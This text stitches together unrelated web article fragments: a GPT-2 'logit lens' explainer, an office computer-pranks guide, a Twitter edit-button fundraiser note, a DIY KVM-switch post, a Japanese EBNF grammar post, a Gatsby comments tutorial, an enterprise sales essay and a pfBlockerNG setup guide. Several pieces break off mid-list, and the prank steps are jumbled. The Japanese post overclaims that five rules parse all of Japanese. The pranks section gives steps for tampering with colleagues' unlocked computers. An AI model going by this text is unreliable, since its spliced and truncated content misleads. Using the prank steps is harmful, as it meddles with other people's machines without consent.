to the inputs. The token at position <em>i</em> should, after flowing through the layers of the model, turn into the token at position <em>i+1</em>. (More accurately, a distribution over the token at position <em>i+1.</em>)</li></ul><li> Vocab and embedding spaces</li><ul><li>The vocab has size <em>N_v</em>=50257, but GPT works internally in a smaller "embedding" vector space, of dimension <em>N_e</em>. </li><ul><li>For example, in the GPT-2 1558M model size, <em>N_e</em>=1600.  (Below, I'll often assume we're talking about GPT-2 1558M for concreteness.)</li></ul><li>There is an <em>N_v</em>-by-<em>N_e</em> embedding matrix <em>W</em> which is used to project the vocab space into the embedding space and vice versa.</li></ul><li> In, blocks, out</li><ul><li>The first thing that happens to the inputs is a multiplication by <em>W</em>, which projects them into the embedding space. <a href="about:blank#fn-AtHPnbaLw7d3539eA-1">[1]</a></li><li>The resulting 1600-dimensional vector then passes through many neural network blocks, each of which returns another 1600-dimensional vector.</li><li>At the end, the final 1600-dimensional vector is multiplied by <em>W's</em> transpose to project back into vocab space.</li><li>The resulting 50257-dim vectors are treated as logits. Applying the softmax function to them gives you the output probability distribution.</li></ul></ul><p>As described above, GPT schematically looks like</p><ul><li>Project the input tokens from vocab space into the 1600-dim embedding space</li><li>Modify this 1600-dim vector many times</li><li>Project the final 1600-dim vector back into vocab space</li></ul><p>We have a "dictionary," <em>W</em>, that lets us convert between vocab space and embedding space at any point.  We know that <em>some</em> vectors in embedding space make sense when converted into vocab space:</p><ul><li>The very first embedding vectors are just the input tokens (in embedding space) </li><li>The very last embedding vectors are just the output logits (in embedding space) </li></ul><p>What about the 1600-dim vectors produced in the middle of the network, say the output of the 12th layer or the 33rd?  If we convert them to vocab space, do the results make sense?  The answer is <em><strong>yes</strong></em>.</p><h2 id="logits">logits</h2><p>For example: the plots below show the logit lens on GPT-2 as it predicts a segment of the abstract of the GPT-3 paper.  (This is a segment in the middle of the abstract; it can see all the preceding text, but I'm not visualizing the activations for it.)</p><p>For readability, I've made two plots showing two consecutive stretches of 10 tokens.  Notes on how to read them:</p><ul><li>The input tokens are shown as 45-degree tilted axis labels at the bottom.</li><li>The correct output (i.e. the input shifted by one) is likewise shown at the top.</li><ul><li>A (*) is added in these labels when the model's top guess matched the correct output.</li></ul><li>The vertical axis indexes the layers (or "blocks"), zero-indexed from 0 to 47.  To make the plots less huge I skip every other intermediate layer.  The Colab notebook lets you control this skipping as you like.</li><li>The top guess for each token, according to the model's activations at a given layer, is printed in each cell.</li><li>The colors show the logit associated with the top guess.  These tend to increase steadily as the model converges on a "good guess," then get refined in the last layers.</li><li>Cells are outlined when their top guess matches the final top guess.</li><li><em>For transformer experts: the "activations" here are the block outputs after layer norm, but before the learned point-wise transformation.</em></li></ul><p><span><figure><img src="https://64.media.tumblr.com/d95b4d3323975d215b99426f16baaf75/fb69b4765ee1e95d-e9/s1280x1920/e86465c01d64c127d42865114fa2df88fcff90c7.png"></figure></span><br><span><figure><img src="https://64.media.tumblr.com/a165e9089fbc5023171fd12c22a2007f/fb69b4765ee1e95d-da/s1280x1920/d8b8aea5737a70f851dc8e8d2e33a5d42b61d288.png"></figure></span></p><p>There are various amusing and interesting things one can glimpse in these plots.  The "early guesses" are generally wrong but often sensible enough in some way:</p><ul><li>"We train GPT-3..." <em>000?</em>  (someday!)</li><li>"GPT-3, an..." <em>enormous? massive?</em>  (not wrong!)</li><li>"We train GPT-3, an aut..." <em>oreceptor?  </em>(later converges to the correct <em>oregressive</em>)</li><li>"model with 175..." <em>million</em>?  (later converges to a comma, not the correct <em>billion</em>)</li></ul><h2 id="ranks">ranks</h2><p>The view above focuses only on the top-1 guess at each layer, which is a reductive window on the full distributions.</p><p>Another way to look at things: we still reduces the <em>final</em> output to the top-1 guess, but we compare other distributions to the final one by looking at the rank of the final top-1 guess. </p><p>Even if the middle of the model hasn't yet converged to the final answer, maybe it's got that answer somewhere in its top 3, top 10, etc.  That's a lot better than "top 50257."</p><p>Here's the same activations as ranks. (Remember: these are ranks of <em>the model's final top-1 prediction,</em> not <em>the true token.</em>)</p><p><span><figure><img src="https://64.media.tumblr.com/4c03e6bf0a90ea6a55ec62d00babdfda/fb69b4765ee1e95d-d1/s1280x1920/e7fbecac341f8705868cae85dbe1646bccda7a42.png"></figure></span></p><p><span><figure><img src="https://64.media.tumblr.com/e272b4d7af3f4c5acabe7bd7236a2bc5/fb69b4765ee1e95d-71/s1280x1920/5ce57c9305ca055d6fa4adecf3855a910770d48c.png"></figure></span></p><p>In most cases, network's uncertainty has drastically reduced by the middle layers.  The order of the top candidates may not be right, and the probabilities may not be perfectly calibrated, but it's got the gist already.</p><h2 id="KL_divergence_and_input_discarding">KL divergence and input discarding</h2><p>Another way of comparing the similarity of two probability distributions is the KL divergence.  Taking the KL divergence of the intermediate probabilities w/r/t the final probabilities, we get a more continuous view of how the distributions smoothly converge to the model's output.</p><p>Because KL divergence is a more holistic measure of the similarity between two distributions than the ones I've used above, it's also my preferred metric for making the point that <em>nothing looks like the input</em>.</p><p>In the plots above, I've skipped the input layer (i.e. the input tokens in embedding space).  Why?  Because they're so different from everything else, they distract the eye!</p><p>In the plots below, where color is KL divergence, I include the input as well.  If we trust that KL divergence is a decent holistic way to compare two distributions (I've seen the same pattern with other metrics), then:</p><ul><li>Immediately, after the very first layer, the input has been transformed into something that looks more like <em>the final output </em>(47 layers layer) than it does like the input.</li><li>After this one discontinuous jump, the distribution progresses in a much more smooth way to the final output distribution.</li></ul><p><span><figure><img src="https://64.media.tumblr.com/948417cb579e11535dfd6160b14215a5/f10041e0cc087cf7-71/s1280x1920/a7f4e5e8be7676e596ad37cce4ba561c988826f0.png"></figure></span></p><p><span><figure><img src="https://64.media.tumblr.com/da5e13b967740adee154f4c9e298a646/f10041e0cc087cf7-2f/s1280x1920/f0fdf4d4b64af6ede1690c2896bdd1106f46b5a2.png"></figure></span></p><p>I show several other examples in the Colab notebook.

		<p>Work sucks sometimes, but it gets really fun when you’re able to pull some <em>Jim VS Dwight</em> level pranks in the workplace.  One of the best and most <strong>time-honored traditions</strong> is to mess with someone’s unlocked computer when they step away from their desk.  These tricks also works at home,<em> just don’t be a jerk about it</em> in either environment!</p><p><span data-ez-name="learnonline_shop-medrectangle-1"><span><span><a href="https://www.ezoic.com/what-is-ezoic/" target="_blank" rel="noopener noreferrer nofollow"><img src="https://go.ezoic.net/utilcave_com/img/ezoic.png"></a></span></span></span></p>
<div>
<div><div>
<div id=""><p>Disclaimer:</p><div><p>
These pranks are all basically harmless, however, the content here is provided for <strong>informational purposes only</strong>.</p>
<p><strong>Do not perform these pranks on computers you don’t own!</strong>  Pranks can get you fired, cause physical or mental injury including death and could be used against you in a lawsuit or criminal proceeding.</p>
<p><strong>I recommend using this guide to block these pranks</strong> by following the security information included with at the end of each one.<br>
</p></div></div>
</div></div>
<div><div>
<p>A little over 14 years ago, <a href="http://techheadaches.blogspot.com/2006/07/guide-to-computer-pranks-how-to-freak.html">I wrote this guide on computer pranks</a> <span>[<i></i> blogspot.com]</span>.  The article hasn’t aged well, which is why I am writing this newer and bigger version today.</p>
<p>In today’s article, I explore 13 of the best computer pranks you can pull on your co-workers, roommates, spouses and other people you want to prank.</p>
<p>This guide <em>also</em> serves as <strong>13 reasons why you should lock your computer every time you step away</strong>… even for a few moments.  After-all, you are only as secure as your weakest link!</p>
<p>Most importantly, <strong>I also include methods to stop each of the pranks</strong> so that you’re immune even without locking your system (you should still lock your systems!)</p>
</div></div>
</div>
<div id=""><div>
<div><p><i></i> How To Manually Lock Your Computer</p><div><p>
Choose one.  The first one is really easy to remember and quick to perform when walking away from your computer.  </p>
<ul>
<li>Hold the <strong>Windows Key + L</strong></li>
<li>Press <strong>Control + Alt + Delete</strong> and then hit <strong>Enter</strong></li>
<li>Windows 10: Click on the <strong>Start menu</strong>, on the far left side of the Start menu, click your <strong>Avatar/Username</strong> and then click <strong>Lock</strong></li>
<li>Mac: <strong>Opt + Cmd + Eject</strong> to put your computer to sleep.</li>
<li>Mac: <strong>Control + Shift + Eject</strong> to turn off the monitor only.</li>
</ul>
<p><strong>At the end of the article, I discuss <em>multiple ways to automatically lock your computer</em>.</strong>  However, you should still manually lock your computer because there are some real problems that come along with automatically locking.</p>

<p>Why not?  <strong>Lots of reasons.</strong>  This can get you into big trouble, as impersonating the <em>wrong person</em> can have <em>serious consequences</em>.  However, <strong>leaving a workstation unlocked can also have serious repercussions</strong>, which is normally the reason why this prank gets performed.</p>

<p><strong>This, along with all the other pranks listed here, might be perceived as <em>bullying</em>.</strong>  To try and avoid that, <strong>this “prank” should be disclosed to each employee</strong> beforehand so that they know <em>anyone</em> who leaves their workstation unattended is subject to this happening.  Also, <strong>no one should actually have to provide free food or drinks because they left their computer unlocked.</strong></p>

<p>For Outlook individually, you can require manual password entry each time mail is processed, but <strong>this includes every time Outlook refreshes your mailbox to check for new mail</strong>.  I don’t recommended it, but here is how to enable it if you like pain:</p>
<ul>
<li>Open Outlook.</li>
<li>Goto <strong>File &gt; Account Settings &gt; Account Setting &gt;</strong></li>
<li>Select your account.  Click the <strong>Change</strong> button.</li>
<li>Click on the <strong>More Settings</strong> button and then the <strong>Security</strong> tab.</li>

<p>This one takes some time, so it’s best when you have a couple of minutes at least.  The impact of this prank is definitely more noticeable on mobile devices, where you rely on auto-correct and suggestions to form sentences.  However, for users who spend a lot of time either in-browser or in applications like Word, this can be a crazy prank.</p>

<p>You can do <em>a lot</em> of <em>productive</em> stuff with Outlook rules, but I’m not here to talk about that.  Instead, the focus is on using Outlook rules to play a crazy loud sound audio clip when certain emails arrive.</p>

<li>Download a funny audio clip to their computer.  You can find a giant library of quick sound files at <a href="https://www.soundboard.com/">https://www.soundboard.com/</a></li>
<li>Find a common email in their inbox and right click on it, select <strong>Rules</strong>.  Click on <strong>Create Rule</strong> to bring up the <strong>Create Rule</strong> window.</li>
<li>You should select one of the first 3 checkboxes for defining the rules conditions.  These are the things that must happen to trigger a rule.  For example, you could set your email address as the <strong>Sent To</strong> trigger for the rule.</li>
<li>Under the <strong>Do the following</strong> section, select <strong>Play a selected sound</strong>.</li>
<li>Now click the <strong>Browse</strong> button and select the sound file you downloaded in the first step.</li>

Hey everyone,</p>

<p>It's long overdue for Twitter to add an edit button. It's really not that hard.</p>

<p>Help us put this billboard next to Twitter HQ so we can get the 2 days of
<br>engineering work that's required prioritized.</p>

<p>If we raise more than the $2,590 goal, we'll get a bigger billboard.</p>

<p>I heard they use Rails, so I went ahead and wrote the code for them:
<br>https://gist.github.com/vicramon/6162c558e9e5f2b9c763504402937ed1</p>

<p>There, now just copy and paste!</p>

<p>With â�¤ï¸�,</p>

<p>The internet.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I like my two big hi-res monitors. I love my keyboard and my mouse. And I connect them to my stationary
“main” PC and to several other Windows and Mac laptops, alternatively. I’d like to easily switch where these peripheral
devices are connected to, and that’s the traditional role of a <a href="https://en.wikipedia.org/wiki/KVM_switch">KVM switch</a>.</p><p>Unfortunately for me, KVM switches that support 4K/60hz resolutions cost hundreds of dollars, there are
no KVM switches that support USB-C, and I couldn’t find KVM switches that support multiple high-res monitors
either.</p><p>So I decided to implement a mixed hardware/software solution: my monitors (all monitors today really) have more
than one input, so I can connect all my computers simultaneously. The idea is:</p><ul><li>Switch USB devices in hardware.</li><li>Detect this switch in software, and switch monitors inputs as needed.</li></ul><p>To switch USB devices, I ordered <a href="https://www.amazon.ca/gp/product/B01N6GD9JO">this USB 3.0 two-computer switch</a> from Amazon,
that’s $38 Canadian, under $30 USD.</p><p>To automatically switch monitor inputs, I <a href="https://github.com/haimgel/display-switch">wrote some software</a>.</p><p>My plan was:</p><ul><li>Watch for USB device connections/disconnections.</li><li>When a configured device is connected, use <a href="https://en.wikipedia.org/wiki/Display_Data_Channel#DDC/CI">DDC/CI</a> to
send a command to all connected monitors to switch inputs.</li><li>In case the power management turned the video output off, turn it on again (otherwise the monitors will auto-switch
back to the input that actually supplies video output).</li></ul><p>I needed this to happen on Windows and on a Mac, and mature cross-platform support for USB low-level
control and hot plug, DDC/CI and monitor power management is non-existent. I ended up implementing this two
times: <a href="https://github.com/haimgel/display-switch/tree/master/MacOS">once in Swift</a>, for MacOS, and the
<a href="https://github.com/haimgel/display-switch/tree/master/Windows">second time in Rust</a>, for Windows.</p><p>Amazingly enough, this works really well: when I press the button on the USB switch, monitor input is changed
instantaneously, it feels like a “real” KVM switch! 🎉</p></div></div>]]>

<p>We create a 5-rule parser to efficiently and accurately parse affirmative present tense sentences in Japanese.  With just 5 rules you can understand Japanese grammar deeply.</p>



<h2>Deconstructing Japanese</h2>



<p>Linguistics is often unnecessarily complicated.  “Why state concisely with one term when there are 300 different varieties for these intimates and particulars?!”  Simplicity speaks volumes and good teachers teach simple concepts that help unify greater features easily.</p>



<p>To that end, let’s see if we can produce Japanese with an EBNF grammar.</p>



<p>For this we will be using <a href="https://github.com/Engelberg/instaparse">an excellent functional library for clojure called Instaparse</a>.  </p>



<p><a href="http://instaparse-live.matt.is/#/-LxnE95QbDy2LZ_m5XAZ/v1">You can see a <em>live</em> <em>demo</em> of Instaparse online with this grammar here.</a></p>



<p>Update: 2020-1-8: A fully recursive parser can be found here <a href="http://instaparse-live.matt.is/#/-Ly5y7xvJoDkHhIs0UKD/v1">http://instaparse-live.matt.is/#/-Ly5y7xvJoDkHhIs0UKD/v1</a></p>



<h2>What’s an EBNF grammar?</h2>



<p>It’s like a regular expression for sentences.  “Extended Backus-Naur Form.” If you’re familiar, skip ahead.  If not…<br><a href="https://condor.depaul.edu/ichu/csc447/notes/wk3/BNF.pdf">Here’s a useful slideshow.</a>  The wikipedia article is not for the uninitiated, but <a href="http://matt.might.net/articles/grammars-bnf-ebnf/">this article</a> is a bit clearer if you are new to this way of representing grammars.       EBNF is from the realm of “Context-Free Grammars” and is mainly used in computing.  Given that it is definitely about grammar and syntax, EBNF proves very useful in language analysis and generation.  You make rules for breaking down sequences of characters (sentences) into labeled output chunks (parse tree).</p>



<h2>Is it possible to parse Japanese with EBNF?</h2>



<p>Can we make any real headway using <em>computer syntax</em> to decipher human language?  English seems impossible for native language speakers to parse at times.  Is it really possible to parse Japanese with EBNF and label parts of speech accurately?</p>



<h3>はい！ Yes!</h3>



<p>Yes!  However, for <strong>real</strong> Japanese from the wild there would need to be many many rules, and any slight deviations from the rules would not result in a full parse.  So, rather than try and build our own google translate today, why don’t we just try to cover the maximum amount of Japanese with the minimum amount of rules.</p>

<h2>Rules for an EBNF Japanese Grammar</h2>



<p>Japanese has nouns, verbs, particles, and sentence-final-fitters.  That’s it. *  <strong>With 5 concepts we can cover the whole Japanese grammar.</strong>  Amazing.  Japanese is regular enough that its composition can be described in a handful of rules.</p>



<ol><li>A sentence is made of zero or more Bunsetsu-Jars and a Sentence-Final-Fitter. <br><strong>S = JAR* SFF</strong></li><li>A Bunsetsu-Jar is made of zero or more Modifiers, and must have a noun and a particle. <br><strong>JAR = M* noun-no P |  JAR* noun-no no</strong> <p><em>[UPDATE 2020-1-8: fully recursive with extension of rule 2]</em></p></li><li>Particles can be any of the Japanese grammar particles that describe the role of their preceding word in a sentence: が、を、と、で、に、etc。 <br><strong>P = が | を | と | で | に …</strong></li><li>Sentence-Final-Fitters have only 4 options and can be either nouns with the Copula だ (da), or simply verbs with u, or verbs with i.<br><strong>SFF = noun-no だ。 | noun-na だ。 | verb-u。 | verb-i。<br></strong>(sentence-final period included in this rule)</li><li>Modifiers can be nouns  with their relevant letter (“no” or “na”), or simply verb-u or verb-i.<br><strong>M = noun-no の | noun-na な | verb-u | verb-i</strong></li></ol>



<p>With just 5 main rules we can parse all of Japanese.  That’s exciting!  Granted, this is not negation or past tense, just present affirmative, but with small extensions those advancements are accommodatable. </p>

<p>Notice Japanese has no spaces, all parsing relies on accurate detection of symbol in sequence.  ImagineifEnglishhadnospaceswoulditbehardtoread?</p>



<h2><strong>Recursion Update 2020-1-8</strong></h2>



<p>By extending Rule 2 (JAR = … ) to include JAR*, we achieve full recursion on Japanese terms using の [no]</p>

<h2>Death to Adjectives</h2>



<p>Japanese has nouns that take な [na] and nouns that take の [no] when they are used as modifiers.  </p>



<p>Japanese also has verbs that end with an う [u = oo as in “food”] sound and verbs that end with an い [i = ee as in “week”] sound.</p>



<p>Bringing “adjectives” into the mix just gets things really dirty and offers no benefit to the learner.  Stick with 2 kinds of verb and 2 kinds of noun and Japanese will be easy to master.</p>

<h2>Parsing Improves Comprehension</h2>



<p>Important in language learning are the exercises that parse written language correctly.  Learning how the written language is parsed can help one’s mental model, and this will lend to stronger audible comprehension thanks to a deeper understanding of the underlying structure.</p>

<p>*When we say “that’s it,” we are putting words like おいしい into the verb-i column, and words like げんきな into the noun-na column.  Simplifying into two categories, nouns and verbs, actually proves immensely useful and practical in Japanese.  It’s a simplification that should be in all the textbooks and literature.  Congrats 2020.</p>

<![CDATA[Using GitHub Issues for Comments with Gatsby]]>
            </title>

September 2, 2020 | https://blog.geritol.tech/using-github-issues-for-comments-with-gatsby/ | <a href="https://web.archive.org/web/*/https://blog.geritol.tech/using-github-issues-for-comments-with-gatsby/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So you have an awesome statically generated blog that requires no dinamic hosting.
Awesome!</p>
<p>Now you want to add comments to your blog posts. Doom. That’s some dynamic content. You will need to deal with user autentication, storing data and offering an API to retrieve the comments. This is a quite complex task.</p>
<p>We could use some external services like <em>Disqus</em>, but this goes against the static site mentality, adds tracking and ads to our site.</p>
<p>Luckily there is a service that offers the above features and a nice GraphQL API, so if your blog is mainly intended for developers, you can use <strong>Github Issues</strong> for comments. Credits for <a href="https://pknopf.com/post/2018-10-13-comments-for-static-sites-using-github-issues/" target="_blank" rel="nofollow noopener noreferrer">Paul Knopf</a> for the original idea.</p>

<p>So the concept is that we will assign a Github issue for each of our posts. We will instruct Gatsby to fetch issue comments for the posts based on the issue’s id. Our readers can head to that issue and add comments to it. Our static site host will receive a webhook notification when a new comment is posted and rebuild our site.</p>
<p>If you want a TLDR on how to do it, checkout the <a href="https://github.com/geritol/blog.geritol.tech/commit/0d3f8d9dce7b7059407e895150be7ddcbc99c6ef" target="_blank" rel="nofollow noopener noreferrer">commit</a> in which I enabled comments for this site.</p>
<h2>Adding the plugin</h2>
<p>To be able to fetch information from Github’s API via GraphQL, we need to register a plugin.
This requires us to install <code>gatsby-source-graphql</code> as a dependency.</p>
<div data-language="javascript"><pre><code>
module<span>.</span>exports <span>=</span> <span>{</span>
  plugins<span>:</span> <span>[</span>
    <span>{</span>
      resolve<span>:</span> <span><span>`</span><span>gatsby-source-graphql</span><span>`</span></span><span>,</span>
      options<span>:</span> <span>{</span>
        typeName<span>:</span> <span><span>`</span><span>GitHub</span><span>`</span></span><span>,</span>
        fieldName<span>:</span> <span><span>`</span><span>github</span><span>`</span></span><span>,</span>
        url<span>:</span> <span><span>`</span><span>https://api.github.com/graphql</span><span>`</span></span><span>,</span>
        headers<span>:</span> <span>{</span>
          Authorization<span>:</span> <span><span>`</span><span>Bearer </span><span><span>${</span>process<span>.</span>env<span>.</span><span>GITHUB_API_KEY</span><span>}</span></span><span>`</span></span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span></code></pre></div>
<h2>Writing the query</h2>
<p>In your template you will need to extend your GraphQL page query with the following:</p>
<div data-language="javascript"><pre><code>

<span>export</span> <span>const</span> pageQuery <span>=</span> graphql<span><span>`</span><span>
  query BlogPostWithComment($slug: String!, $issueId: Int!) {
    github {
      repository(name: "blog.geritol.tech", owner: "geritol") {
        issue(number: $issueId) {
          id
          comments(first: 30) {
            nodes {
              id
              author {
                login
                url
                avatarUrl
              }
              bodyHTML
              createdAt
              reactionGroups {
                content
              }
            }
          }
        }
      }
    }
  }
</span><span>`</span></span></code></pre></div>
<p>This will tell Gatsby to fetch the first 30 comments for a post based on its <code>issueId</code>.<br>
Do not forget to replace <code>repository(name: "blog.geritol.tech", owner: "geritol")</code> with your repository info.</p>
<h2>Gluing it together</h2>
<p>Somewhere where you are calling <code>createPage</code> we will need to pass the issueId to it so our query can execute properly.</p>
<div data-language="javascript"><pre><code><span>createPage</span><span>(</span><span>{</span>
  path<span>:</span> post<span>.</span>node<span>.</span>fields<span>.</span>slug<span>,</span>
  component<span>:</span> blogPostWithComment<span>,</span>
  context<span>:</span> <span>{</span>
    slug<span>:</span> post<span>.</span>node<span>.</span>fields<span>.</span>slug<span>,</span>
    issueId<span>:</span> post<span>.</span>node<span>.</span>frontmatter<span>.</span>issue<span>,</span>
    previous<span>,</span>
    next<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span></code></pre></div>
<p>This allows us to provide our issue id in the frontmatter of our blogposts eg.:</p>
<div data-language="markdown"><pre><code><span>---</span>
title: My awesome post
<span>issue: 1
<span>---</span></span></code></pre></div>
<h2>Wrapping it up</h2>
<p>Alright. Now we have comment information fetched for our post. We just need to display it.</p>
<p>This is not in the scope of this post, but if you want to get some inspiration, check out how I did it <a href="https://github.com/geritol/blog.geritol.tech/commit/0d3f8d9dce7b7059407e895150be7ddcbc99c6ef" target="_blank" rel="nofollow noopener noreferrer">here</a>.</p>
<p>To have your site re-generated when somebody comments on Github, you can use Github webhooks to launch a rebuild on your site when a new comment arrives. I use <a href="https://www.netlify.com/" target="_blank" rel="nofollow noopener noreferrer">Netlify</a> which nicely supports this.</p>
<h2>Possible areas for improvement</h2>
<ul>
<li>Also display reaction for comments and for the issue (the post itself)</li>
<li>Distribute this as a standalone gatsby plugin (not sure if this is possible or not)</li>
<li>Improve on the comment styling (maybe <a href="https://github.com/utterance" target="_blank" rel="nofollow noopener noreferrer">utterances</a> is a good resource for this)</li>
</ul></div></div>]]>

Nobody likes being told “No”</p>

<p>To sell your product to enterprise buyers, minimize the times when you need to say “No” during the sales cycle.</p>

<p>Enterprise software purchasing is a complex process with potentially innumerable stakeholders and procedural hurdles to cross. Even if you have a badass product that will perfectly fit your customer’s needs, you still need to wade through a complex buying process.</p>

<p>The decision to buy a product like Netflix is simple: I want to watch a once-in-a-generation classic like “<a href="https://bestlifeonline.com/selling-sunset/">Selling Sunset</a>,” so I pay for Netflix to stream it into my greedy eyeballs. As an individual, I make the purchasing decision and enjoy the rewards alone (thankfully).</p>

<p><img src="https://staysaasy.com/assets/enterprise_say_no/sunset.jpeg" alt="Selling Sunset">
I actually think that most of the characters on this show would be absolutely lethal at selling enterprise software</p>

<p>Contrast this to a buyer like the US Air Force deciding to use Slack – even just calculating the number of users that they’ll have is a non-trivial task, and that’s for a relatively straightforward, consumer-friendly SaaS product. Transformational changes – say, <a href="https://techcrunch.com/2018/07/26/jedi-10-billion-department-of-defense-bidding/">moving to the cloud</a> – can be <a href="https://techcrunch.com/2020/05/08/microsoft-and-aws-exchange-poisoned-pen-blog-posts-in-latest-pentagon-jedi-contract-spat/">exponentially more complex</a>. The number of stakeholder approvals and compliance hurdles that must be vanquished on the way to this sort of purchase boggles the mind, but this is exactly where you make your bones as an enterprise SaaS business.</p>

<h2 id="detractors-want-you-to-say-no">Detractors Want You to Say “No”</h2>

<p>Innumerable potential blockers can arise during a sales cycle: you’ll have to say “No” to a particular use-case provided by the product that you’ll be replacing, or explain why you lack a feature that a buyer was expecting from a previous job. In most cases these gaps are unimportant… but these blockers can really throw a wrench into the sales process.</p>

<p>Adversaries who oppose a new software vendor will latch onto any time when you don’t say “Yes” like a lamprey – poking holes in the case to buy your product. Blocking stakeholders are typically incentivized to either preserve the status quo or explicitly harm your case, and include:</p>

<ul>
  <li>Teams who are incentivized to minimize risk, such as Compliance, Legal, IT, and (in some cases) Security.</li>
  <li>Teams who are frequently blamed if a poor buying decision is made, such as Procurement. Some companies also just have risk-averse, blame-heavy cultures in general.</li>
  <li>Champions of incumbent solutions – for example, an executive who originally purchased the product that you’re replacing.</li>
  <li>People who don’t want to do the work of changing to a new vendor.</li>
  <li>Competitors.</li>
  <li>(Rarely, but occasionally) people who are just nihilistic or obstructionist jerks.</li>
</ul>

<p>One of the biggest enemies when selling to a complex organization is <strong>time</strong>. Buyers get discouraged if it’s taking too long to sign a new vendor, and there’s often a small window when a company is ready for change and the stars have aligned for them to drop some serious coin for it. Detractors will latch onto any “Nos” that they hear and use it to delay or kill a sales cycle. This is especially common when replacing a strong incumbent – you had better believe that Oracle knows every trick in the book to make it seem that your product is untrustworthy or incomplete.</p>

<p>In order to overcome this, allow your sales team to say “Yes” as often as possible. The client is worried about some niche use-case? We have a partner who will make it happen. The client wants a particular security feature? We can make sure that the particular risk the Security team flagged will be handled. The client needs to format their data <em>just right</em> for board meetings? With a little bit of elbow grease on the customer’s part, we can support it.</p>

<p>Ways to say Yes more:</p>

<ol>
  <li>Make your product as flexible as possible - eg make everything programmable via API or expose webhook callbacks for all major business actions. This helps customers, consultants, or your implementation teams extend your product’s capabilities for use-cases that are unique to them, which you’ll never directly build yourself.</li>
  <li>Identify major gaps that will be a pain to build for, and find quality partners who can fill in these capabilities. Similar to the above, this allows you to cover niche functionality that only a few customers will need.</li>
  <li>Make it easy to transfer raw data into or out of your platform. For example, virtually every enterprise product requires some amount of internal executive level reporting, which is typically both critical and highly team-specific. By furnishing raw data exports you can check the box of helping to provide these reports. Being able to ingest or output large volumes of data also helps check the box of whether it’ll be easy to migrate to your product.</li>
  <li>Building common no-regrets enterprise features. For example, the areas of governance (SAML, RBAC), security (password controls, 2FA, internal endpoint protection), compliance (SOC 2, HIPAA), and audit logs are all areas where it’s easy to have a gap that will scare the shit out of a conservative buyer. By building for lots of use-cases in this area, you can ensure that you won’t get ruled out for missing features that are peripheral to your core value proposition.</li>
  <li>Find the right customers. If you’re constantly finding yourself saying No during the sales cycle, you’re probably selling to the wrong folks. This is common for early-stage startups or when your sales &amp; marketing teams aren’t generating enough pipeline (forcing you to sell to weak leads). Having a very strong perspective on why your product is special, and who it’s special for, can help you to avoid this trap. So can having discipline – you’re often better off doubling down on making your core customer deliriously happy than stretching for a flashy new logo.</li>
</ol>

<p>Note that the strongest form of #1 and #2 is turning yourself into a platform that others can build on top of.</p>

<h2 id="case-study-salesforce">Case Study: Salesforce</h2>

<p>Salesforce has a <em>decent</em> product. It’s by far the dominant player in the CRM industry, but it’s hardly a loveable product like (say) Zoom, Uber, Datadog, the iPhone, or even Excel. However, Salesforce has used this product to become the #1 in their industry, in part because their team can sell the hell out of it.</p>

<p>If you look at Salesforce, you’ll see that they use all of the techniques described above to ensure that they always have a story for how they can deliver, even if it requires extra integration work. Combined with their ferocious marketing, it’s little surprise that they’re approaching a $200B market cap as of this writing:</p>

<ul>
  <li>They’re well instrumented with open APIs, and use ampscript to build custom functionality.</li>
  <li>They have an app marketplace built on these APIs that’s filled with niche solutions, creating a platform ecosystem, and will also acquire companies to fill product holes.</li>
  <li>They have a robust set of reporting and data import/export functionality, allowing complex organizations to onboard rapidly with services (if necessary).</li>
  <li>Salesforce has a metric ton of enterprise features, and also aggressively moves to support new platform expansions that enterprises might want, such as migrating to Microsoft Azure for their hosting.</li>
  <li>Salesforce’s target customer is well-defined and obvious – it’s literally in the name.</li>
</ul>

<h2 id="case-study-slack">Case Study: Slack</h2>

<p>Slack got its start by selling to smaller organizations and startups, but has since extended their reach into the enterprise. As time has gone on and they’ve begun to see real competitors, they’ve used all of the this post’s enterprise sales tactics to continue to move up-market:</p>

<ul>

<p>In one of our previous articles, <a rel="noreferrer noopener" href="https://www.advicesplice.com/home-network-ad-blocking-and-security/" target="_blank">Home Network Ad Blocking and Security</a>, we talked about ways to block ads on all your home devices, speed up your network, improve security, and protect your household from harmful content. In that article we recommended pfSense as a wonderful solution to these goals, but didn’t go into the specifics of how to configure anything. We wanted to take a moment to share how to setup pfBlockerNG on pfSense so you have an easy to follow guide to reference.</p>
<p>If you are here, then we’ll assume you already know what pfSense is and you are interested in installing pfBlockerNG. If not, take a moment to check out our <a rel="noreferrer noopener" href="https://www.advicesplice.com/home-network-ad-blocking-and-security/" target="_blank">Home Network Ad Blocking and Security</a> article. </p>
<p>So let’s dive right in…</p>
<h2>Login to pfSense</h2>
<p>If logging into pfSense for the first time, use the default username (<strong>admin</strong>) and password (<strong>pfsense</strong>) and complete your initial setup. Once completed you are ready to get started on installing pfBlockerNG.</p>

<h3>11) Acquire and Input MaxMind License Key</h3>
<p>To use pfBlockerNG’s GeoIP functionality, you must <a rel="noreferrer noopener" href="https://www.maxmind.com/en/geolite2/signup" target="_blank">register for a FREE MaxMind account</a>. Once registered, you will have to create a license key and enter it into the ‘MaxMind License Key’ field in pfBlockerNG.</p>

<h3>12) Ensure IP is Setup</h3>
<p>If not already done, select ‘Deny Outbound’ under ‘Action’. There are additional configurations available to include GeoIP and Reputation blocking. For GeoIP, select ‘Deny Outbound’ for any Continents you wish to block and modify these lists, as needed by selecting the pencil to edit.</p>
<figure><img loading="lazy" width="800" height="271" src="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_13.png" alt="pfBlockerNG IP Config" srcset="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_13.png 800w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_13-300x102.png 300w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_13-768x260.png 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption>12) Ensure IP is Setup</figcaption></figure>
<h3>13) DNS Block List (DNSBL) Config</h3>
<p>DNSBL or a sinkhole/blackhole renders a site in it’s lists inaccessible. This gives you control over what users are able to access on your network.</p>
<h4>DNSBL SafeSearch</h4>
<p>If desired, enable SafeSearch network wide on Google, Yandex, DuckDuckGo, Bing, and PixaBay. You can also set Youtube restrictions and block Firefox DNS over HTTPS.</p>
